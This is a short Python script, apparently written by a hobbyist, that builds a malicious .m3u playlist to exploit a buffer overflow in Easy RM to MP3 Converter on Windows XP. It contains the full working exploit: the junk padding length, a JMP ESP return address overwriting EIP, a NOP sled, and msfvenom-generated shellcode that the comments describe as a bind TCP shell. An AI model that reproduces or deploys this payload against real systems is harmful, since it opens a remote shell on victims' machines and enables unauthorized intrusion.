### This a BIND TCP python shell written for exploting WinXP's Easy RM to MP3 player by uploading a malicious .m3U file. BY using this code, 
### you will be able to generate a malicious .m3U file which will generate our bind shell. This shell which works on any remote host however
##, you can play around with the PORT. Writen by CiiWairoto


##File header information
header= 'EXTM3U\r\n'
line1= '#EXTINF:210,Artist Name - Track Title \r\n'
url_part1= 'http://'
url_part2= '.example.com/test.m3u'

## Buffer information
junk1= '\x41' * 35073 ## Signifies the start of our EIP
eip = '\xE1\xBC\x08\x76' ## Our JMP esp
nops= '\x90' *16 ## This is for padding the payload
buf =  "" ## Our generated buff for the BIND shell using MSFVENOM
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x7d\xbe\xb7\xa3\x83\xee\xfc\xe2\xf4\x81\x56"
buf += "\x35\xa3\x7d\xbe\xd7\x2a\x98\x8f\x77\xc7\xf6\xee\x87"
buf += "\x28\x2f\xb2\x3c\xf1\x69\x35\xc5\x8b\x72\x09\xfd\x85"
buf += "\x4c\x41\x1b\x9f\x1c\xc2\xb5\x8f\x5d\x7f\x78\xae\x7c"
buf += "\x79\x55\x51\x2f\xe9\x3c\xf1\x6d\x35\xfd\x9f\xf6\xf2"
buf += "\xa6\xdb\x9e\xf6\xb6\x72\x2c\x35\xee\x83\x7c\x6d\x3c"
buf += "\xea\x65\x5d\x8d\xea\xf6\x8a\x3c\xa2\xab\x8f\x48\x0f"
buf += "\xbc\x71\xba\xa2\xba\x86\x57\xd6\x8b\xbd\xca\x5b\x46"
buf += "\xc3\x93\xd6\x99\xe6\x3c\xfb\x59\xbf\x64\xc5\xf6\xb2"
buf += "\xfc\x28\x25\xa2\xb6\x70\xf6\xba\x3c\xa2\xad\x37\xf3"
buf += "\x87\x59\xe5\xec\xc2\x24\xe4\xe6\x5c\x9d\xe1\xe8\xf9"
buf += "\xf6\xac\x5c\x2e\x20\xd6\x84\x91\x7d\xbe\xdf\xd4\x0e"
buf += "\x8c\xe8\xf7\x15\xf2\xc0\x85\x7a\x41\x62\x1b\xed\xbf"
buf += "\xb7\xa3\x54\x7a\xe3\xf3\x15\x97\x37\xc8\x7d\x41\x62"
buf += "\xc9\x75\xe7\xe7\x41\x80\xfe\xe7\xe3\x2d\xd6\x5d\xac"
buf += "\xa2\x5e\x48\x76\xea\xd6\xb5\xa3\x5e\x3c\x3e\x45\x17"
buf += "\xae\xe1\xf4\x15\x7c\x6c\x94\x1a\x41\x62\xf4\x15\x09"
buf += "\x5e\x9b\x82\x41\x62\xf4\x15\xca\x5b\x98\x9c\x41\x62"
buf += "\xf4\xea\xd6\xc2\xcd\x30\xdf\x48\x76\x15\xdd\xda\xc7"
buf += "\x7d\x37\x54\xf4\x2a\xe9\x86\x55\x17\xac\xee\xf5\x9f"
buf += "\x43\xd1\x64\x39\x9a\x8b\xa2\x7c\x33\xf3\x87\x6d\x78"
buf += "\xb7\xe7\x29\xee\xe1\xf5\x2b\xf8\xe1\xed\x2b\xe8\xe4"
buf += "\xf5\x15\xc7\x7b\x9c\xfb\x41\x62\x2a\x9d\xf0\xe1\xe5"
buf += "\x82\x8e\xdf\xab\xfa\xa3\xd7\x5c\xa8\x05\x47\x16\xdf"
buf += "\xe8\xdf\x05\xe8\x03\x2a\x5c\xa8\x82\xb1\xdf\x77\x3e"
buf += "\x4c\x43\x08\xbb\x0c\xe4\x6e\xcc\xd8\xc9\x7d\xed\x48"
buf += "\x76"


junk2= '\x43'* 800

## Payload
payload= junk1 + eip + nops + buf + junk2

## Creating our new m3U file
exploit = open('m3uc_exploit.m3u', 'w') 
exploit.write(header+line1+url_part1+payload+url_part2) ## Information in our m3uc_exploit.m3u file
